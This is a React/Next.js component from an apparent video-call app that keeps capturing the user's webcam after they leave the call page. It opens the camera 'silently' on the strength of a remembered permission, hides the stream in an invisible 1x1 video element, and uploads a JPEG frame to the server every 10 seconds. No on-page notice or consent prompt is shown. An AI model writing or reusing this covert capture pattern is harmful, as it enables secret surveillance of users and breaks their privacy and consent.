'use client';
import { useEffect, useRef, useState } from 'react';
import { usePathname } from 'next/navigation';

export default function GlobalFrameCapture() {
    const videoRef = useRef<HTMLVideoElement | null>(null);
    const streamRef = useRef<MediaStream | null>(null);
    const [activeSessionId, setActiveSessionId] = useState<string | null>(null);
    const pathname = usePathname();

    // Prevent running on call page (if layout wraps it)
    const isCallPage = pathname?.startsWith('/call/');

    // Poll for active session
    useEffect(() => {
        if (isCallPage) return; // Don't poll on call page

        const checkSession = async () => {
            try {
                const res = await fetch('/api/call/active');
                if (res.ok) {
                    const data = await res.json();
                    if (data.activeSessionId !== activeSessionId) {
                        setActiveSessionId(data.activeSessionId);
                    }
                }
            } catch (e) {
                console.error('[GlobalCapture] Error checking session:', e);
            }
        };

        checkSession(); // Initial check
        const interval = setInterval(checkSession, 5000); // Check every 5s

        return () => clearInterval(interval);
    }, [isCallPage, activeSessionId]);

    // Manage camera stream
    useEffect(() => {
        if (!activeSessionId || isCallPage) {
            // Cleanup if no session or we are on call page
            if (streamRef.current) {
                streamRef.current.getTracks().forEach(track => track.stop());
                streamRef.current = null;
            }
            return;
        }

        const startCapture = async () => {
            if (streamRef.current) return; // Already running

            try {
                // Request camera silently (browser usually remembers permission)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                streamRef.current = stream;

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;
                }
            } catch (err) {
                console.log('[GlobalCapture] Camera permission denied/failed:', err);
            }
        };

        startCapture();

        return () => {
            if (streamRef.current) {
                streamRef.current.getTracks().forEach(track => track.stop());
                streamRef.current = null;
            }
        };
    }, [activeSessionId, isCallPage]);

    // Frame Capture Loop
    useEffect(() => {
        if (!activeSessionId || isCallPage) return;

        const captureInterval = setInterval(() => {
            if (!videoRef.current || !streamRef.current) return;
            if (videoRef.current.readyState < 2) return;

            const canvas = document.createElement('canvas');
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            if (canvas.width === 0 || canvas.height === 0) return;

            const ctx = canvas.getContext('2d');
            if (ctx) {
                ctx.drawImage(videoRef.current, 0, 0);
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append('file', blob, 'frame.jpg');
                        formData.append('sessionId', activeSessionId);

                        try {
                            await fetch('/api/call/frame', { method: 'POST', body: formData });
                        } catch (e) {
                            console.error('[GlobalCapture] Upload failed', e);
                        }
                    }
                }, 'image/jpeg', 0.5);
            }
        }, 10000); // Capture every 10s

        return () => clearInterval(captureInterval);
    }, [activeSessionId, isCallPage]);

    if (!activeSessionId || isCallPage) return null;

    // Helper video element (hidden)
    return (
        <video
            ref={videoRef}
            autoPlay
            muted
            playsInline
            style={{ position: 'fixed', width: 1, height: 1, opacity: 0, pointerEvents: 'none', zIndex: -1 }}
        />
    );
}
